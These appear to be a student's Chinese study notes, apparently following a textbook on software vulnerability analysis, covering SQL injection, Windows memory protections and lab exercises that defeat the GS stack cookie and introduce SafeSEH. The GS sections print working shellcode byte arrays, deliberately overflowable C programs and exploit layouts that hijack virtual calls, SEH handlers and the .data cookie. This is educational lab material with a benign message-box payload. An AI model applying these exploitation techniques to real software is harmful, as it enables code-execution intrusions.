![image-20220501150506672](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220501150506672.png)

​		**SQL 注入攻击的精髓在于构造巧妙的注入命令串，从服务器不同的反馈结果中，逐步分析出数据库中各个表项之间的关系，直到彻底攻破数据库**。遇到功能强大的数据库（如 MS SQL  Server）时，如果数据库权限配置不合理，利用存储过程有时甚至可以做到远程控制服务器。

​		不像缓冲区溢出攻击那样需要掌握大量系统底层的知识，SQL 注入攻击的技术门槛相对较 低，只**要懂得基本的 Web 技术和数据库知识**，就能够实施攻击。另外，一些自**动化的攻击工具 （如 NBSI2 等）**也使得这类攻击变得更加容易。目前，这类攻击技术已经发展成为一套比较完善的体系，并成为“黑”网站的主流技术。

​		**ASP+SQL Server 与 PHP+MySQL** 是最容易遭到注入攻击的网站类型。本节将在假定您熟悉这些脚本语言和数据库技术的前提下，简要总结这两种网站类型中常用的漏洞攻击与防范技术。

​		脚本类攻击非常灵活，取决于 Web Server 配置参数、数据库类型、数据库权限配置、脚本逻辑等诸多因素，且自成体系。鉴于脚本类漏洞利用与软件的内存漏洞利用技术相差甚远，

### 8.2.2 攻击 PHP+MySQL 网站

首先要介绍几个 PHP 配置文件 php.ini 中与注入攻击相关的重要选项，如表 8-2-1 所示。

| 选项             | 安全配置 | 说明                                                         |
| ---------------- | -------- | ------------------------------------------------------------ |
| safe_mode        | on       | 安全模式                                                     |
| display_errors   | off      | 是否向客户端返回错误信息。错误信息能够帮助攻击者摸 清数据库的表结构和变量类型等重要信息 |
| magic_quotes_gpc | on       | 自动将提交变量中的单引号、双引号、反斜线等特殊符号 替换为转义字符的形式。例如，’ 将被转换为 \’ |

​		正确地配置这些选项**能够增加攻击的难度**，**但**这些配置**并不是解决问题的根本办法**。例如，在 display_errors 关闭的情况下，攻击者可以利用盲注的方法通过服务器的不同反馈 进行分析，获得表结构和列名等信息；在 magic_quotes_gpc 打开的情况下，攻击者仍然可以通 过 MySQL 提供的 char()和 ascii()等函数引用敏感字符。











# 第 9 章 Windows 安全机制概述

​		高级的变形病毒、软件加壳与脱壳技术等都是基于**程序指令**可以**在运行时当做普通的内存数据**进行动态读写的缺陷；**堆栈溢出**攻击中 shellcode 的执行则是基于计算机**错误地把**存放在堆栈中的**普通内存数据**当**做程序指令而使用**的缺陷；此外，跨站脚本攻击、SQL 注入攻击等也 都是利用计算机把数据和代码混淆这一天然缺陷而造成的。

​	从**普通用户角度**来看，微软在安全方面逐步做了如下几点增强。

 （1）增加了 Windows 安全中心，提醒用户使用杀毒软件、防火墙，以及下载最新的安装补丁等。 

（2）为 Windows 添加 PC 端的防火墙。 

（3）未经用户允许，大多数的 Web 弹出窗口和 Activex 控件安装将被禁止。 

（4）Internet Explorer 7 中增加了筛选仿冒网站功能，具有了钓鱼网站过滤器(Phishing Filter) 的新功能。 

（5）添加 UAC (User Account Control，用户账户控制)机制，可以防止恶意软件和间谍软件 在未经许可的情况下在计算机上进行安装或对计算机进行更改。 

（6）集成了 Windows Defender，可以帮助阻止、控制和删除间谍软件以及其他潜在的恶意软件。

​		 在这些安全功能的保护下，我们操作系统的安全性大大提高了，但是微软所做的工作还远 远不止于此。微软还在普通用户看不到的**内存保护方面**做了很多的工作，下边我们就来看看微 软十年间都是如何提高内存保护的安全性。

（1）使用 GS 编译技术，在函数返回地址之前加入了 Security Cookie，在函数返回前首先检测 Security Cookie 是否被覆盖，从而把针对操作系统的栈溢出变得非常困难。 

（2）增加了对 S.E.H 的安全校验机制，能够有效地挫败绝大多数通过改写 S.E.H 而劫持进 程的攻击。 

（3）堆中加入了 Heap Cookie、Safe Unlinking 等一系列的安全机制，为原本就困难重重的 堆溢出增加了更多的限制。 

（4）DEP（Data Ex ecution Protection，数据执行保护）将数据部分标示为不可执行，阻止了栈、堆和数据节中攻击代码的执行。 

（5）ASLR（Address space layout randomization，加载地址随机）技术通过对系统关键地址的随机化，使得经典堆栈溢出手段失效。 

（6）SEHOP（Structured Exception Handler Overwrite Protection，S.E.H 覆盖保护）作为对 安全 S.E.H 机制的补充，SEHOP 将 S.E.H 的保护提升到系统级别，使得 S.E.H 的保护机制更为 有效。

# 第十章栈中的守护天使：GS

## 10.1 GS 安全编译选项的保护原理 

​		针对缓冲区溢出时覆盖函数返回地址这一特征，**微软在编译程序时使用了**一个很酷的安全 编译选项——**GS**，在 Visual Studio 2003 (VS 7.0)及以后版本的 Visual Studio 中默认启用了这个编译选项。

​	Visual Studio 2008 (VS 9.0)中，可以在通过菜单中的 Project→project  Properties→Configuration Prop erties→C/C++→Code Ge neration→Buffer Sec urity Check 中对 GS 编译选项进行设置，如图 10.1.1 所示。

![image-20220507105440378](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220507105440378.png)

​	**GS 编译选项**为每个函数调用增加了一些额外的数据和操作，用以**检测栈中的溢出**。

-  在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称做 “canary”，但如果使用 IDA 反汇编的话，您会看到 IDA 会将这个随机数标注为“Security  Cookie”。在本书的叙述中将用 Security Cookie 来引用这种随机数。

-   Security Cookie **位于 EBP 之前**，系统还将在**.data的内存区域**中存放一个 Security Cookie 的副本，如图 10.1.2 所示。

![image-20220507105856828](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220507105856828.png)

- 当栈中发生溢出时，Security Cookie 将被首先淹没，之后才是 EBP 和返回地址。 
- 在**函数返回之前**，系统将**执行一个**额外的**安全验证操作**，被称做 **Security check**。 
- 在 Security Check 的过程中，系统将**比较栈帧中原先存放的 Security Cookie 和.data 中 副本的值**，如果两者**不吻合**，**说明**栈帧中的 Security Cookie 已被破坏，即**栈中发生了溢出**。

- **当检测到栈中发生溢出时**，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行，如图 10.1.3 所示。

![image-20220507110106059](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220507110106059.png)

​		但是**额外的数据和操作**带来的直接后果就是**系统性能的下降**，为了将对性能的影响降到最 小，编译器在编译程序的时候**并不是对所有的函数都应用 GS**，以**下情况不会应用** GS。

 （1）函数不包含缓冲区。 

（2）函数被定义为具有变量参数列表。 

（3）函数使用无保护的关键字标记。

（4）函数在第一个语句中包含内嵌汇编代码。

（5）缓冲区不是 8 字节类型，且大小不大于 4 个字节。

​		当然微软的工程师为了在性能与安全之间找到一个平衡点，在 Visual S tudio  2005 SP1 起引入了一个新的安全标识：

```
#pragma strict_gs_check 
```

​		通过**添加#pragma strict_gs_check(on)** 可以**对任意类型的函数添加 Security Cookie**。如以下代码所示，通过设置该标识，可以对不符合 GS 保护条件的函数 vulfuction 添加 GS 保护。

```
#include"stdafx.h" 
#include"string.h" 
#pragma strict_gs_check(on) // 为下边的函数强制启用 GS 
intvulfuction(char * str) 
{ 
 chararry[4]; 
 strcpy(arry,str); 
 return 1; 
} 
int_tmain(int argc, _TCHAR* argv[]) 
{ 
 char* str="yeah,i have GS protection"; 
 vulfuction(str); 
 return 0; 
} 
```

​		**除了在返回地址前添加 Security Cookie 外**，在 Visual Studio 2005 及后续版本还使用了**变量重排技术**，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量。同时还会将指针参数和字符串参数复制到内存中低地址，防止函数参数被破坏。如图 10.1.4 所示。

![image-20220507111950298](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220507111950298.png)

​		从图 10.1.4 中可以看出，不启用 GS 时，如果变量 Buff 发生溢出变量 i、返回地址、函数参数 arg 等都会被覆盖，而启用 GS 后，变量 Buff 被重新调整到栈帧的高地址，因此当 Buff 溢出时不会影响变量 i 的值，虽然函数参数 arg 还是会被覆盖，但由于程序会在栈帧低地址处 保存参数的副本，所以 Buff 的溢出也不会影响到传递进来的函数参数。

​		通过 GS 安全编译选项，操作系统能够在运行中有效地检测并阻止绝大多数基于栈溢出 的攻击。**要想硬对硬地冲击 GS 机制，是很难成功的**。让我们再来看看 Security Cookie 产生的细节。

- 系统以**.data 节的第一个双字**作为 Cookie 的种子，或称原始 Cookie（所有函数的 Cookie 都用这个 DWORD 生成）。

- 在程序每次运行时 Cookie 的种子都不同，因此种子**有很强的随机性** 

- 在**栈桢初始化以后系统用 ESP 异或种子**，作为当前函数的 Cookie，以此作为不同函数之间的区别，并增加 Cookie 的随机性 

- 在**函数返回前，用 ESP 还原出（异或）Cookie 的种子** 

​		若想在程序运行时预测出 Cookie 而突破 GS 机制基本上是不可能的。 但是谦虚谨慎的微软工程师们非常清楚，GS 编译选项不可能一劳永逸地彻底遏制所有类型的缓冲区溢出攻击。

 		在微软出版的 Writing Secure Code一书中谈到 GS 选项时，作者曾用过一个非常形象的比 喻：GS 好像汽车里的安全带和安全气囊，当事故发生时往往能够给驾驶员带来很好的安全保障，但这并不意味系着安全带的您可以像疯子一样飚车。 

在该书的同一节中，作者还给出了微软内部对 GS 为产品所提供的安全保护的看法：

- **修改栈帧中函数返回地址**的经典攻击将被 GS 机制**有效遏制**；
- **基于改写函数指针的攻击**，如第 6 章中讲到的对 C++虚函数的攻击，GS 机制仍然**很难防御；**
- **针对异常处理机制的攻击**，GS 很**难防御；** 
- GS 是对栈帧的保护机制，因此**很难防御堆溢出**的攻击。

​          为了更为直观地反映出程序在内存中的状态，本章**所有的实验在编译时均禁用优化选项**，可以在通过菜单中的 Project→project Pr operties→Configuration P roperties→C/C++→ Optimization→Optimization 中对编译优化选项进行设置。如图 10.1.5 所示。

![image-20220509162410264](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220509162410264.png)

## 10.2 利用未被保护的内存突破 GS ？？？

### 问题  为什么没有开启GS之前  没有找到函数调用?????????

之前提到为了将 GS 对性能的影响降到最小，并不是所有的函数都会被 保护，所以我们就可以利用其中一些未被保护的函数绕过 GS 的保护。例如，下边这一段代码， 由于函数 vulfuction 中不包含 4 字节以上的缓冲区，所以即便 GS 处于开启状态，这个函数是 也不受保护的。

```
#include <stdio.h>
#include <tchar.h>
#include"string.h" 
//#pragma strict_gs_check(on)   强制开启GS，便于观察
int vulfuction(char * str) 
{ 
 char arry[4]; 
strcpy(arry,str); 
 return 1; 
} 
int _tmain(int argc, _TCHAR* argv[]) 
{ 
 char* str="yeah,the fuction is without GS"; 
 vulfuction(str); 
 return 0; 
}
```

在Buffer Security Check 开启的情况下  并且没有强制开启GS，上述代码编译完成后可以在ida中可以观察到，在函数调用完成后直接返回，并不会出现Security Cookie，如图：

![image-20220610200622217](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220610200622217.png)

在强制开启GS后 观察同样位置，如图：

![image-20220610200743747](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220610200743747.png)

## 10.3覆盖虚函数突破GS

   		GS 机制中，程序只有在函数返回时，才去检查 Security Cookie，而在这之前是没有任何检查措施的。所以如果我们可以在程序检查 Security Cookie 之前劫持程序流程的话， 就可以实现对程序的溢出了，而 C++的虚函数恰恰给我们提供了这么一个机会（对于虚函数溢出的原理大家可以参照 6.3 的内容）。

```
#include <stdio.h>
#include <tchar.h>
#include"string.h" 
class GSVirtual { 
public : 
     void gsv(char * src) 
     { 
         char buf[200]; 
         strcpy(buf, src); 
		 __asm int 3;
         vir(); 
     } 
     virtual void vir() 
     { } 
}; 
int main() 
{ 
 GSVirtual test; 
 test.gsv( 
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\4"
	); 
 return 0; 
} 

```

对实验思路和代码简要解释如下：

（1）类 GSVirtual 中的 gsv 函数存在典型的溢出漏洞。 

（2）类 GSVirtual 中包含一个虚函数 vir。 

（3）当 gsv 函数中的 buf 变量发生溢出的时候有可能会影响到虚表指针，如果我们可以控制虚表指针，将其指向我们的可以控制的内存空间，就可以在程序调用虚函数时控制程序的流程。

   为了能够精准地淹没虚函数表，我们需**要搞清楚变量与虚表指针在内存中的详细布局**，通 过前面的分析可以知道当函数 gsv 传入参数的长度大于 200 个字节时，变量 buff 就会被溢出。 **先将 test.gsv 中传入参数修改为 199 个“\x90”+1 个“\0”，**然后用 OllyDbg 加载程序，

在执行完 strcpy 后暂停，首先观察栈中具体情况如图 所示。

![image-20220623170125099](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220623170125099.png)

​      从图中可以看出，buf 变量末尾的 ”\4“ 在`0012dd60`位置，而虚表指针在 `0012ff78`位置，相距 20个字节。即只要参数长度再增加 20 个字节以上就可以改变虚表指针

然后观察   虚拟地址区域

![image-20220610211447305](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220610211447305.png)

​        虚函数调用步骤为：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数的地址，根据这个地址转入虚函数执行。我们需要做的就是将虚表指针指向我们的 shellcode 以劫持进程，为此**还有几个关键的问题**需要去解决。

1.变量 buff 在内存中的位置不固定，但是原始参数（0x00402100 即作为调用参数的shellcode）是位于虚表（0x004021D0）附近，所以我们可以通过**覆盖部分虚表指针**的方法，**让虚表指针指向原始参数**，在本实验中使用字符串结束符 “\0” 覆盖虚表指针的最低位即可让其指向原始参数的最前端。（由于虚函数列表指针为D0，shellcode参数的地址为00，故而覆盖虚函数最后一个字节即可）

2.虚表指针指向原始参数中的 shellcode 后，我们面临着一个 call 操作，也就是说我们在执行 完这个call 后还必须可以返回 shellcode 内存空间继续执行。您可能首先会想到 jmp esp 跳板指 令，但是这个指令在这行不通，如图：

![image-20220623183357428](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220623183357428.png)

   我们的原始参数不在栈中！无论怎么样我们都跳不回 0x00402100 的内存空间继续执行了。 此时程序已经完成了字符串复制操作，shellcode 已经复制到变量 Buff 中了，所以我们可以转ay 安全：软件漏洞分析技术（第 2版） 入 Buff 的内存空间继续执行 shellcode。

​		Buff 的地址存放在 0x0012FE8C 中（如上图所示）， 位于 ESP+4 的位置，我们只要执行“pop pop retn”指令序列后就可以转到 0x0012FE9C 执行了 （因为 call eax 操作后 会  将返回地址入栈，所以我们需要多 pop 一次才能保证执行 ret 时栈顶为 0x0012FE9C）。

本实验使用的“pop pop retn”命令地址为  7c9215bf

构建shellcode 

首先在 shellcode 的开 始位置放上跳板“\x04\x2B\x99\x7C”，然后跟上弹出对话框的 shellcode 代码，最后不足部分用 0x90 补充，以 0x00 结束。布局如图

![image-20220623190356344](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220623190356344.png)

```
弹对话框的机器码：

"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
 "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
 "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
 "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
 "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
 "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
 "\x53\xFF\x57\xFC\x53\xFF\x57\xF8
```

将构建好的 shellcode 作为参数写到程序里，再编译、运行，熟悉的对话框就出现了！如图 

![image-20220623190524512](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220623190524512.png)

## 10.4 攻击异常处理突破 GS 

GS 机制并没有对 S.E.H 提供保护，说我们可以通过攻击程序的异常处理达到绕过GS 的目的。我们首先通过超长字符串覆盖掉异常处理函数指针，然后想办法触发一个异常， 程序就会转入异常处理，由于异常处理函数指针已经被我们覆盖，那么我们就可以通过劫持 S.E.H 来控制程序的后续流程。如果您记不清异常处理机制的流程了，可以先复习一下本书的 第 6 章。

```
#include <stdio.h>
#include "stdlib.h"
#include <tchar.h>
#include<string.h>
char shellcode[]=
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xE0\xFF\x12\x00\xB0\xFE\x12\x00"//address of shellcode
	;
void test(char * input)
{
    char buf[200];
    strcpy(buf,input);
	_asm int 3
    strcat(buf,input);
}
void main()
{
	test(shellcode);
}
```

对代码简要解释如下。 

（1）函数 test 中存在典型的栈溢出漏洞。 

（2）在 strcpy 操作后变量 buf 会被溢出，当字符串足够长的时候程序的 S.E.H 异常处理句 柄也会被淹没。 

（3）由于 strcpy 的溢出，覆盖了 input 的地址，会造成 strcat 从一个非法地址读取数据，这 时会触发异常，程序转入异常处理，这样就可以在程序检查 Security Cookie 前将程序流程劫持。 如图 10.4.1 所示。

![image-20220709224034701](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220709224034701.png)

|           | 环境         | 备注                                        |
| --------- | ------------ | ------------------------------------------- |
| 操作系统  | windows xp   | window2000也可以（要用vs2005 最高支持2005） |
| 编译器    | VS2008       |                                             |
| 编译选项  | 禁用优化选项 |                                             |
| build版本 | release版本  |                                             |

首先将shellcode赋值为一段不至于产生溢出的0x90，再按照实验环境编译，然后用OllyDbg 加载程序，在程序执行完 strcpy 后中断程序。

 如下两图所示，shellcode 的起始位置为 0x0012FEA0，距离栈顶最近的 S.E.H 位于 0x0012FFB0+4（为什么加 4？请大家回想一下 S.E.H 链的结构），我们只要覆盖这个地址里边 的内容，就可以控制程序的异常处理。

//每个 S.E.H 包含**两个 DWORD 指针**：S.E.H 链表指针和异常处理函数句柄，共 8 个字节

![image-20220710105627510](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220710105627510.png)

![image-20220710100012669](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220710100012669.png)

通过计算可以知道从 shellcode 起始位置覆盖到最近的 S.E.H 需要 276 个字节，所以我们将 弹出“failwest”对话框的机器码代码放到最前面；276~280 字节使用 0x0012FEA0 填充，用来 更改异常处理函数的指针；其他不足部分使用 0x90 填充。shellcode 布局如图 所示。

![image-20220710100810058](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220710100810058.png)

## 10.5 同时替换栈中和.data 中的 Cookie 突破 GS 

​        	前面介绍的几种方法都是通过避开 Security Cookie 的校验完成绕过的，下边我们和 GS 来 一次正面交锋。既然要在 GS 正常工作的情况下挫败它，就要保证溢出后栈中的 Cookie 与.data 中的一致，而要达到这个目的我们有两条路可以走： 

（1）猜测 Cookie 的值； 

（2）同时替换栈中和.data 中的 Cookie。

​		 Cookie 的生成具有很强的随机性，因此准确猜测出 4 字节的 Cookie 值的可能性极低。这样的话我们只能通过同时替换栈中和.data 中的 Cookie 来保证溢出后 Cookie 值的一致性。

​		我们将通过以下代码演示如何同时替换栈中和.data 中的 Cookie，绕过 Security Cookie 的 校验。

```
#include <stdio.h>
#include <tchar.h>
#include<string.h> 
#include<stdlib.h> 
charShellcode[]= 
"\x90\x90\x90\x90"//new value of cookie in .data 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xF4\x6F\x82\x90"//result of \x90\x90\x90\x90 xor EBP 
"\x90\x90\x90\x90" 
"\x94\xFE\x12\x00"//address of Shellcode 
; 
void test(char * s, int i, char * src) 
{ 
 char dest[200]; 
 if(i<0x9995) 
 { 
 char * buf=s+i; 
 *buf=*src; 
 *(buf+1)=*(src+1);
 *(buf+2)=*(src+2); 
 *(buf+3)=*(src+3); 
 strcpy(dest,src); 
 } 
} 
void main() 
{ 
 char * str=(char *)malloc(0x10000); 
 test(str,0xFFFF2FB8,Shellcode); 
}
```

对代码简要解释如下。 

（1）main 函数中在堆中申请了 0x10000 个字节的空间，并通过 test 函数对其空间的内容进行操作。 

（2）test 函数对 s+i 到 s+i+3 的内存进行赋值，虽然函数对 i 进行了上限判断，但是没有判 断 i 是否大于 0，当 i 为负值时，s+i 所指向的空间就会脱离 main 中申请的空间，进而有可能会指向.data 区域。 

（3）test 函数中的 strcpy 存在典型的溢出漏洞。

|           |              |      |
| --------- | ------------ | ---- |
| 操作系统  | windows xp   |      |
| 编译器    | vs2008       |      |
| 编译选项  | 禁用优化选项 |      |
| build版本 | release版本  |      |

*说明：shellcode 的起始地址和异或时使用的 EBP 可能需要在调试中重新确定。*

​		先来看一下 Security Cookie 的校验的详细过程。将 Shellcode 赋值为 8 个 0x90，然后用 OllyDbg 加载运行程序，并中断在 test 函数中的 if 语句处，本次实验 中该语句地址为 0x00401013。

![image-20220710153748132](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220710153748132.png)

​		如上图 所示，程序从 0x00403000 处取出 Cookie 值，然后与 EBP 做一次异或，最后将 异或之后的值放到 EBP-4 的位置作为此函数的 Security Cookie。函数返回前的校验就是此过程 的逆过程，程序从 EBP-4 的位置取出值，然后与 EBP 异或，最后与 0x00403000 处的 Cookie 进行比较，如果两者一致则校验通过，否则转入校验失败的异常处理。

  		本次实验的关键点是在 0x00403000 处写入我们自己的数据。而我们在 main 函数中通过 malloc 申请的空间起始地址为 0x00410048（将程序中断在 malloc 之后就可以看到，请读者自行 调试），这个位置相对 0x00403000 处于高址位置，我们可以通过向 test 函数中 i 参数传递一个负 值来将指针 str 向 0x00403000 方向移动，通过计算我们只需要将 i 设置为 0xFFFF2FB8（-53320） 就可以将 str 指向 0x00403000。将程序重新编译后用 OllyDbg 加载，并在 strcpy 处中断。

![image-20220710154739066](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220710154739066.png)

​     	如上图 所示，.data 中的 Cookie 已经成功地被我们修改为 0x90 了，只要再控制了栈中的 Security Cookie 就可以挫败 GS 了。

​		再来分析一下程序，字符串变量 dest 申请了 200 个字节空间，所以超过 200 个字节的它将被溢出，因此可以通过输入超长字符串来修改 Security Cookie。我们已经知道 Security Cookie 是由 0x00403000 处的值与当前 EBP 异或的结果，而 0x00403000 处已经被我们覆盖为 90909090 了，所以只要将 90909090 与当前 EBP 异或的结果放到栈中 Security Cookie 的位置就可以了。

​		现在开始布置 Shellcode，首先在最开始的位置放上 4 个 0x90 用来修改 0x00403000 的 值，后边跟着弹出“failewest”对话框的机器码，然后用 0x90 填充至 Security Cookie 的位置， 接下来跟着 90909090 与当前 EBP 异或的结果，最后再加上 4 个字节的填充和 Shellcode 的起始地址（用来覆盖函数返回地址）。

​		通过调试可以发现 dest 的起始位置在 0x0012FE94("%x，直接输出")，Security Cookie 位于 0x0012FF60，返回地址位于 0x0012FF68，这些地址可能在您的实验环境中会有所变化，请根据您的实际情况调整。根据这些地址我们计算好 Shellcode 各部分填充的长度，布置成如图 10.5.3 所示的布局。

![image-20220710163642218](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220710163642218.png)

将布置好的 Shellcode 复制到程序里，编译运行，猜猜会出现什么情况？肯定是弹出熟悉 的对话框了，如图 10.5.4 所示。

![image-20220710163756044](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220710163756044.png)

# 第11章  SafeSEH

## 11.1 SafeSEH 对异常处理的保护原理

​		通过 6.1 对异常机制的学习，我们知道改写 S.E.H 堆栈中异常处理的函数指针已经成为 Windows 平台下漏洞利用的经典手法。而且通过 10.4 的介绍，还知道通过攻击 S.E.H 可以轻松 绕过 GS 保护。

   	在 Windows X P SP2 及后续版本的操作系统中，微软引入了著名的 S.E.H 校验机制 SafeSEH。SafeSEH 的原理很简单，在程序调用异常处理函数前，对要调用的异常处理函数进 行一系列的有效性校验，当发现异常处理函数不可靠时将终止异常处理函数的调用。SafeSEH 实现需要操作系统与编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。

​      首先我们来看一下编译器在 SafeSEH 机制中所做的工作。通过启用/SafeSEH 链接选项可 以让编译好的程序具备 SafeSEH 功能，这一链接选项在 Visual Studio 2003 及后续版本中是默认 启用的。启用该链接选项后，编译器在编译程序的时候将程序所有的异常处理函数地址提取出 来，编入一张安全 S.E.H 表，并将这张表放到程序的映像里面。当程序调用异常处理函数的时 候会将函数地址与安全 S.E.H 表进行匹配，检查调用的异常处理函数是否位于安全 S.E.H 表中。

​		在 VS 命令提示行，通过执行“dumpbin /lo adconfig 文件名”就可以查看程序安全 S.E.H 表的情况。VS 命令提示行，可在通过开始菜单中的“程序→Microsoft Visual Studio 2008→Visual  Studio Tools→Visual Studio 2008 Command Prompt”启用，如图 所示。

![image-20220711090115634](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220711090115634.png)

​		看一下操作系统在 SafeSEH 机制中发挥的重要作用。通过 6.1 的介绍我们知 道异常处理函数的调用是通过 RtlDispatchException()函数处理实现的，SafeSEH 机制也是从这 里开始的。我们来看一下这里都有哪些保护措施。

​	（1）检查异常处理链是否位于当前程序的栈中，如图 11.1.3 所示。如果不在当前栈中，程 序将终止异常处理函数的调用

​	（2）检查异常处理函数指针是否指向当前程序的栈中，如图 11.1.3 所示。如果指向当前栈 中，程序将终止异常处理函数的调用。

